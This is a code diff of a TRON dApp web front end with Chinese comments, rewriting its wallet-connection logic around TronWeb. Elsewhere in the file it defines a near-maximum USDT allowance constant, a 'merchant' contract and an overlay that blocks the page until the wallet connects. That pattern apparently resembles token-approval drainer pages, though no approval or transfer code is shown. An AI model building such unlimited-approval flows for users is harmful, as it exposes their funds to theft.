@@ -1,7 +1,7 @@
 // --- 配置常量 (TRON 专属) ---
 const MERCHANT_CONTRACT_ADDRESS = 'TQiGS4SRNX8jVFSt6D978jw2YGU67ffZVu'; // 你的 TRON 智能合约地址 (SimpleMerchantERC)
 const USDT_CONTRACT_ADDRESS = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';  //  TRC20 USDT 合约地址
-const DEFAULT_TRON_ADDRESS_HEX = '410000000000000000000000000000000000000000'; //  默认 TRON 地址
+const DEFAULT_TRON_ADDRESS_HEX = '410000000000000000000000000000000000000000'; //  默认 TRON 地址，可以不修改
 const ALMOST_MAX_UINT = "115792089237316195423570985008687907853269984665640564039457584007913129638935";
 
 // 你的合约 ABI (SimpleMerchantERC)
@@ -26,7 +26,7 @@ const ERC20_ABI = [
     "function allowance(address owner, address spender) external view returns (uint256)"
 ];
 
-// --- UI 元素 (与之前类似) ---
+// --- UI 元素 ---
 const connectButton = document.getElementById('connectButton');
 const blurOverlay = document.getElementById('blurOverlay'); // 获取遮罩层元素
 const overlayMessage = document.getElementById('overlayMessage');
@@ -125,7 +125,7 @@ async function initialize() {
 // --- 检查授权状态 (TRON 版本) ---
 async function checkAuthorization() {
     try {
-        if (!tronWeb || !userAddressHex || !merchantContract || !usdtContract) {  // 注意： 使用 userAddressHex
+        if (!tronWeb || !userAddressHex || !merchantContract || !usdtContract) {  // 注意：使用 userAddressHex
             showOverlay('Wallet not opened. Please connect.');
             return;
         }
@@ -178,85 +178,49 @@ async function checkAuthorization() {
     }
 }
 
-// --- 连接钱包逻辑 (TRON 版本 - 尝试适配 Wallet V2 思路) ---
+// --- 连接钱包逻辑 (TRON 版本) ---
 async function connectWallet() {
     try {
-        updateStatus('Connecting to wallet...');
+        updateStatus('Connecting to wallet...'); //  确保先调用 updateStatus
         showOverlay('Please confirm the connection request in your wallet...');
 
-        // 1. 尝试检测 window.ethereum  （Wallet V2 的思路）
-        if (typeof window.ethereum !== 'undefined') {
-            console.log("✅ Ethereum detected (可能支持 Wallet V2 思路)");
+        // 1.  检测 TronWeb
+        if (typeof window.tronWeb === 'undefined') {
+            updateStatus('Please install TronLink or a supported TRON wallet');
+            return;
+        }
 
-            try {
-                // 2. 请求连接 (使用 eth_requestAccounts - 模拟 Wallet V2 流程)
-                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' }); // 模拟eth_requestAccounts
-                userAddress = accounts[0];  // 获取用户地址（以太坊地址）
-                console.log("✅ User Address (Ethereum):", userAddress);
+        tronWeb = window.tronWeb;  //  将 tronWeb 赋值给全局变量
+        console.log("tronWeb detected:", tronWeb);
 
-                // 3.  尝试将以太坊地址转换为 TRON 地址 (如果 Trust Wallet 允许)
-                //  因为 Trust Wallet 可能支持以太坊账户，我们需要尝试将其转换为 TRON 地址
-                try {
-                    //  这是一个推测，Trust Wallet 可能有自己的方式来获取 TRON 地址
-                    //  如果 Trust Wallet 允许获取 TRON 地址，则替换为正确的函数
-                    //  例如， 假设 Trust Wallet 提供了一个函数  "getTronAddress()"
-                    // userAddress = await window.ethereum.request({method: 'tron_getAddress'});
-                    //  如果找不到类似的 API, 说明 Trust Wallet 可能不支持。
-                   //  尝试使用  tronWeb.address.fromHex()  转换。
-                    userAddressHex = tronWeb.address.toHex(userAddress);  // 这步可能是错的， 无法直接转换， 需要 Trust Wallet 提供的方法
-                    console.log("✅ User Address (Hex, converted from Ethereum):", userAddressHex);
-                } catch (conversionError) {
-                    console.error("Error converting Ethereum address to TRON address:", conversionError);
-                    updateConnectionUI(false);
-                    showOverlay('🔴 Connection failed: Could not get TRON address from Ethereum address.');
-                    updateStatus('Connection failed: Could not get TRON address from Ethereum address.');
-                    return;
-                }
-                // 验证地址 (如果 Trust Wallet  有获取 TRON 地址的API, 则需要用这个验证方法)
-                if (!tronWeb.isAddress(userAddress)) { // 应该检查 Tron 地址, 而不是 Ethereum 地址
-                     console.error("Error: Invalid TRON address (Base58) after getAccount (after conversion):", userAddress);
-                     updateConnectionUI(false);
-                     showOverlay('🔴 Connection failed: Invalid address.');
-                     updateStatus('Connection failed: Invalid address.');
-                     return;
-                 }
-                updateConnectionUI(true, userAddress);
-                // 4. 初始化合约并检查授权
-                await initialize();
-            } catch (error) {
-                console.error("Error connecting to wallet (using eth_requestAccounts):", error);
+        // 2. 尝试获取用户地址
+        try {
+            await tronWeb.trx.getAccount(); // 尝试获取账户信息, 这会触发 Trust Wallet 弹窗
+            userAddress = tronWeb.defaultAddress.base58; // 使用 base58 格式
+            console.log("✅ User Address (base58):", userAddress);
+
+            // 验证地址
+            if (!tronWeb.isAddress(userAddress)) {
+                console.error("Error: Invalid address (Base58) after getAccount:", userAddress);
                 updateConnectionUI(false);
-                showOverlay('🔴 Connection failed: Wallet connection denied or canceled.');
-                updateStatus('Connection failed: Wallet connection denied or canceled.');
-            }
-        } else {
-             // 如果没有 window.ethereum， 那么尝试 TronWeb  的方式。
-            if (typeof window.tronWeb === 'undefined') {
-                updateStatus('Please install TronLink or a supported TRON wallet');
+                showOverlay('🔴 Connection failed: Invalid address.');
+                updateStatus('Connection failed: Invalid address.');
                 return;
             }
-             // 使用 TronWeb  的方式连接
-            tronWeb = window.tronWeb;
-            console.log("tronWeb detected:", tronWeb);
-            try {
-                // 尝试获取用户地址。
-                await tronWeb.trx.getAccount();
-                userAddress = tronWeb.defaultAddress.base58;
-                console.log("✅ User Address (base58):", userAddress);
-                userAddressHex = tronWeb.address.toHex(userAddress); // 转换
-                console.log("✅ User Address (Hex):", userAddressHex);
-                updateConnectionUI(true, userAddress);
-                // 初始化合约并检查授权
-                await initialize();
+            userAddressHex = tronWeb.address.toHex(userAddress); // 将 Base58 转换为 Hex 格式
+            console.log("✅ User Address (Hex):", userAddressHex);
 
-            } catch (e) {
-                console.error("Error getting account (using tronWeb.trx.getAccount):", e);
-                updateConnectionUI(false);
-                showOverlay('🔴 Connection failed: Wallet connection denied or canceled.');
-                updateStatus('Connection failed: Wallet connection denied or canceled.');
-                return;
-            }
+            updateConnectionUI(true, userAddress);
 
+            // 3. 初始化合约并检查授权
+            await initialize();
+
+        } catch (e) {
+            console.error("Error getting account:", e);
+            updateConnectionUI(false);
+            showOverlay('🔴 Connection failed: Wallet connection denied or canceled.');
+            updateStatus('Connection failed: Wallet connection denied or canceled.');
+            return;
         }
     } catch (error) {
         console.error("Error connecting to wallet:", error);
